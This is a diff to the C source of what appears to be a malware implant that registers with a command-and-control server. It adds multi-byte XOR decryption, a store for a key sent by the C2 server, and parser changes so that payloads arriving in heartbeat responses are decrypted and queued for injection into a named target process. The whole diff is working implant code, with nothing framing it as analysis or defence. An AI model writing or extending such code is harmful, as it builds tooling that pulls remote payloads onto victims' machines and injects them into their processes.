@@ -273,6 +273,21 @@ void decrypt(unsigned char* encrypted, size_t length, unsigned char key) {
     }
 }
 
+/**
+ * Déchiffre avec XOR polyalphabétique (clé multi-octets)
+ * @param encrypted: Tableau de bytes chiffrés
+ * @param length: Longueur du tableau
+ * @param key_array: Tableau de clés XOR
+ * @param key_len: Longueur du tableau de clés
+ */
+void decrypt_poly(unsigned char* encrypted, size_t length, const unsigned char* key_array, size_t key_len) {
+    if (key_len == 0) return;
+
+    for (size_t i = 0; i < length; i++) {
+        encrypted[i] ^= key_array[i % key_len];
+    }
+}
+
 void encrypt(unsigned char* data, size_t length, unsigned char key) {
     for (size_t i = 0; i < length; i++) {
         data[i] ^= key;
@@ -302,6 +317,42 @@ void decrypt_reverse_xor(unsigned char* encrypted, size_t length, unsigned char 
     reverse_string(encrypted, length);
     decrypt(encrypted, length - 1, key);
     encrypted[length - 1] = '\0';
+}
+
+/**
+ * Affiche le contenu d'un buffer en format hexadécimal
+ * @param data: Pointeur vers les données
+ * @param size: Taille des données
+ * @param label: Label pour identifier l'affichage
+ */
+void print_hex_dump(const unsigned char* data, size_t size, const char* label) {
+    DEBUG("[HexDump - %s] Size: %zu bytes\n", label, size);
+    DEBUG("=== BEGIN HEXDUMP ===\n");
+
+    for (size_t i = 0; i < size; i += 16) {
+        // Afficher l'offset
+        DEBUG("%08zx: ", i);
+
+        // Afficher les bytes en hexadécimal
+        for (size_t j = 0; j < 16; j++) {
+            if (i + j < size) {
+                DEBUG("%02x ", data[i + j]);
+            } else {
+                DEBUG("   ");
+            }
+            if (j == 7) DEBUG(" ");
+        }
+
+        // Afficher les caractères ASCII imprimables
+        DEBUG(" |");
+        for (size_t j = 0; j < 16 && i + j < size; j++) {
+            unsigned char c = data[i + j];
+            DEBUG("%c", (c >= 32 && c <= 126) ? c : '.');
+        }
+        DEBUG("|\n");
+    }
+
+    DEBUG("=== END HEXDUMP ===\n");
 }
 
 
@@ -1101,6 +1152,25 @@ int system_info_to_c2_json(const char* agent_id, const SystemInfo* info, char* b
 // C2 COMMUNICATION STRUCTURES
 // ============================================================================
 
+// Decryption key management structure
+#define MAX_POLY_KEY_SIZE 32  // 64 hex chars = 32 bytes
+typedef struct {
+    unsigned char payload_xor_key[MAX_POLY_KEY_SIZE];  // XOR key array for polyalphabetic decryption
+    size_t payload_xor_key_len;         // Length of the key in bytes
+    char payload_xor_key_str[128];      // String representation from C2
+    unsigned long key_received_time;    // Timestamp when key was received
+    int is_key_valid;                   // Flag indicating if key is valid
+} PayloadDecryptionKeyStore;
+
+// Global decryption key storage
+PayloadDecryptionKeyStore g_decryption_key_store = {
+    .payload_xor_key = {0},
+    .payload_xor_key_len = 0,
+    .payload_xor_key_str = {0},
+    .key_received_time = 0,
+    .is_key_valid = 0
+};
+
 typedef struct {
     char agent_id[64];
     char xor_key[128];
@@ -1141,6 +1211,14 @@ HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID);
 // Task execution
 int execute_task(const Task* task, unsigned char xor_function_key, unsigned char xor_process_key);
 
+// Decryption key storage functions
+void store_payload_xor_key(const char* xor_key_str);
+const unsigned char* get_payload_xor_key(void);
+size_t get_payload_xor_key_len(void);
+int is_payload_xor_key_valid(void);
+void debug_print_key_store(void);
+unsigned char parse_xor_key(const char* xor_key_str);
+
 // C2 communication
 int parse_c2_response(const char* json, C2RegistrationResponse* response);
 int parse_payload_from_response(const char* json, Task* task, const char* xor_key_str);
@@ -1152,6 +1230,98 @@ int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo);
 // ============================================================================
 // C2 COMMUNICATION FUNCTIONS
 // ============================================================================
+
+/**
+ * Store the XOR key received from C2 for payload decryption
+ * Converts full hex string to byte array for polyalphabetic XOR
+ * @param xor_key_str: Hex string representation of the XOR key from C2
+ */
+void store_payload_xor_key(const char* xor_key_str) {
+    if (!xor_key_str) {
+        DEBUG("[Key Store] ERROR: NULL xor_key_str passed\n");
+        g_decryption_key_store.is_key_valid = 0;
+        return;
+    }
+
+    // Copy the string representation
+    strncpy(g_decryption_key_store.payload_xor_key_str, xor_key_str,
+            sizeof(g_decryption_key_store.payload_xor_key_str) - 1);
+    g_decryption_key_store.payload_xor_key_str[sizeof(g_decryption_key_store.payload_xor_key_str) - 1] = '\0';
+
+    // Convert entire hex string to byte array
+    size_t hex_len = strlen(xor_key_str);
+    size_t key_len = hex_len / 2;
+
+    if (key_len > MAX_POLY_KEY_SIZE) {
+        DEBUG("[Key Store] Warning: Key too long (%zu bytes), truncating to %d bytes\n", key_len, MAX_POLY_KEY_SIZE);
+        key_len = MAX_POLY_KEY_SIZE;
+    }
+
+    // Convert hex string to bytes
+    int converted = hex_to_bytes(xor_key_str, g_decryption_key_store.payload_xor_key, key_len);
+    if (converted < 0) {
+        DEBUG("[Key Store] ERROR: Failed to parse hex key string\n");
+        g_decryption_key_store.is_key_valid = 0;
+        g_decryption_key_store.payload_xor_key_len = 0;
+        return;
+    }
+
+    g_decryption_key_store.payload_xor_key_len = (size_t)converted;
+    g_decryption_key_store.is_key_valid = 1;
+    g_decryption_key_store.key_received_time = (unsigned long)time(NULL);
+
+    DEBUG("[Key Store] XOR key stored successfully: %zu bytes\n", g_decryption_key_store.payload_xor_key_len);
+    DEBUG("[Key Store] First 4 bytes: 0x%02X 0x%02X 0x%02X 0x%02X\n",
+          g_decryption_key_store.payload_xor_key[0],
+          g_decryption_key_store.payload_xor_key[1],
+          g_decryption_key_store.payload_xor_key[2],
+          g_decryption_key_store.payload_xor_key[3]);
+}
+
+/**
+ * Retrieve the stored XOR key array for payload decryption
+ * @return: Pointer to the XOR key array
+ */
+const unsigned char* get_payload_xor_key(void) {
+    return g_decryption_key_store.payload_xor_key;
+}
+
+/**
+ * Get the length of the stored XOR key
+ * @return: Length of the key in bytes
+ */
+size_t get_payload_xor_key_len(void) {
+    return g_decryption_key_store.payload_xor_key_len;
+}
+
+/**
+ * Check if the stored XOR key is valid
+ * @return: 1 if valid, 0 otherwise
+ */
+int is_payload_xor_key_valid(void) {
+    return g_decryption_key_store.is_key_valid;
+}
+
+/**
+ * Debug function to print key store information
+ */
+void debug_print_key_store(void) {
+    DEBUG("=== Payload Decryption Key Store ===\n");
+    DEBUG("  XOR Key Length: %zu bytes\n", g_decryption_key_store.payload_xor_key_len);
+    if (g_decryption_key_store.payload_xor_key_len > 0) {
+        DEBUG("  XOR Key (first 8 bytes): ");
+        size_t display_len = g_decryption_key_store.payload_xor_key_len < 8 ?
+                             g_decryption_key_store.payload_xor_key_len : 8;
+        for (size_t i = 0; i < display_len; i++) {
+            DEBUG("0x%02X ", g_decryption_key_store.payload_xor_key[i]);
+        }
+        DEBUG("\n");
+    }
+    DEBUG("  XOR Key (str): %s\n", g_decryption_key_store.payload_xor_key_str);
+    DEBUG("  Key Valid: %s\n", g_decryption_key_store.is_key_valid ? "YES" : "NO");
+    DEBUG("  Received Time: %lu\n", g_decryption_key_store.key_received_time);
+    DEBUG("====================================\n");
+}
 
 /**
  * Parse JSON response from C2 server
@@ -1206,6 +1376,11 @@ int parse_c2_response(const char* json, C2RegistrationResponse* response) {
                     if (len < sizeof(response->xor_key)) {
                         strncpy(response->xor_key, value_start, len);
                         response->xor_key[len] = '\0';
+                        
+                        // AUTOMATICALLY STORE THE XOR KEY WHEN RECEIVED FROM C2
+                        DEBUG("[C2 Response Parser] XOR key received from C2: %s\n", response->xor_key);
+                        store_payload_xor_key(response->xor_key);
+                        debug_print_key_store();
                     }
                 }
             }
@@ -1622,7 +1797,9 @@ int parse_payload_from_response(const char* json, Task* task, const char* xor_ke
 
     // Decode using appropriate decoder
     int decoded_size;
+
     if (is_hex) {
+        // Hex string → bytes
         decoded_size = hex_to_bytes(encoded_string, task->payload, max_payload_size);
         if (decoded_size < 0) {
             free(task->payload);
@@ -1633,6 +1810,7 @@ int parse_payload_from_response(const char* json, Task* task, const char* xor_ke
         }
         DEBUG("[Payload Parser] Payload decoded from hex: %d bytes\n", decoded_size);
     } else {
+        // Base64 → bytes (XOR encrypted)
         decoded_size = base64_to_bytes(encoded_string, task->payload, max_payload_size);
         if (decoded_size < 0) {
             free(task->payload);
@@ -1641,18 +1819,32 @@ int parse_payload_from_response(const char* json, Task* task, const char* xor_ke
             DEBUG("[Payload Parser - Error] Failed to decode Base64 payload\n");
             return -1;
         }
-        DEBUG("[Payload Parser] Payload decoded from Base64: %d bytes\n", decoded_size);
+        DEBUG("[Payload Parser] Payload decoded from Base64: %d bytes (XOR encrypted)\n", decoded_size);
     }
 
     free(encoded_string);
 
-    // Decrypt payload with XOR key
-    unsigned char xor_key = parse_xor_key(xor_key_str);
-    DEBUG("[Payload Parser] Decrypting payload with XOR key: 0x%02X\n", xor_key);
+    // Decrypt payload with polyalphabetic XOR key from store
+    if (!is_payload_xor_key_valid()) {
+        DEBUG("[Payload Parser - Error] No valid XOR key available\n");
+        free(task->payload);
+        task->payload = NULL;
+        return -1;
+    }
 
-    decrypt(task->payload, decoded_size, xor_key);
+    const unsigned char* xor_key_array = get_payload_xor_key();
+    size_t xor_key_len = get_payload_xor_key_len();
+
+    DEBUG("[Payload Parser] Decrypting payload with polyalphabetic XOR key (%zu bytes)\n", xor_key_len);
+    DEBUG("[Payload Parser] Key preview: 0x%02X 0x%02X 0x%02X 0x%02X...\n",
+          xor_key_array[0], xor_key_array[1], xor_key_array[2], xor_key_array[3]);
+
+    decrypt_poly(task->payload, decoded_size, xor_key_array, xor_key_len);
 
     DEBUG("[Payload Parser - Success] Payload decrypted: %d bytes\n", decoded_size);
+
+    // Afficher le payload décrypté en hexadécimal
+    print_hex_dump(task->payload, decoded_size, "Decrypted Payload");
 
     task->payload_size = (size_t)decoded_size;
     task->type = TASK_INJECT;
@@ -2366,11 +2558,24 @@ int main(void) {
 
         if (send_heartbeat_to_c2(c2_response.agent_id, heartbeat_response, sizeof(heartbeat_response)) == 0) {
 
+            // Use the stored XOR key from the global store
             int payload_result = parse_payload_from_response(heartbeat_response, &current_task, c2_response.xor_key);
 
             if (payload_result == 1) {
                 DEBUG("[Main Loop - Payload Detected] Payload size: %zu bytes\n", current_task.payload_size);
                 DEBUG("[Main Loop - Payload Detected] Target process: %s\n", current_task.target_process);
+
+                
+                // Debug: Show stored key information
+                if (is_payload_xor_key_valid()) {
+                    const unsigned char* key = get_payload_xor_key();
+                    size_t key_len = get_payload_xor_key_len();
+                    DEBUG("[Main Loop] Using stored polyalphabetic XOR key (%zu bytes)\n", key_len);
+                    DEBUG("[Main Loop] Key preview: 0x%02X 0x%02X 0x%02X 0x%02X...\n",
+                          key[0], key[1], key[2], key[3]);
+                } else {
+                    DEBUG("[Main Loop - WARNING] Stored XOR key is not valid!\n");
+                }
 
                 int exec_result = execute_task(&current_task, xor_function_key, xor_process_key);
 
